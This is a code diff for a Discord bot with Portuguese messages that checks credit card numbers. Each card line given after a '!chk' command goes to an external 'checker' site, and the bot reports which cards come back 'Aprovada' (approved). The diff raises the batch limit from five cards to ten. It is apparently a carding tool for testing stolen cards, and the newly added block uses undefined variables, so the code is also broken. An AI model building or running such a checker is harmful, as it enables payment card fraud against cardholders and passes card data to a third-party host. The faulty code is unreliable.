@@ -46,12 +46,19 @@ bot.on('message', (msg) => {
 
 function Check(message) {
 var cc = message.content.replace("!chk ", "").split("\n");
-if(cc.length > 5){
-return message.reply("5 CC POR VEZ FDP");
+if(cc.length > 10){
+return message.reply("** O LIMITE DE CARTÕES É __10__**");
 }
         cc.forEach(function (value) {
       Request("http://thelimaochecker.tk/painel/full/apibot.php?dados=" + value, function(result) {
             message.channel.send(result);
+			if (resultado.match("Aprovada")) {
+			msg.channel.send({embed: {
+            color: 1752220,
+            description: "O Bot só funciona no grupo."
+          }});
+        return;
+			}
       });
         });
 
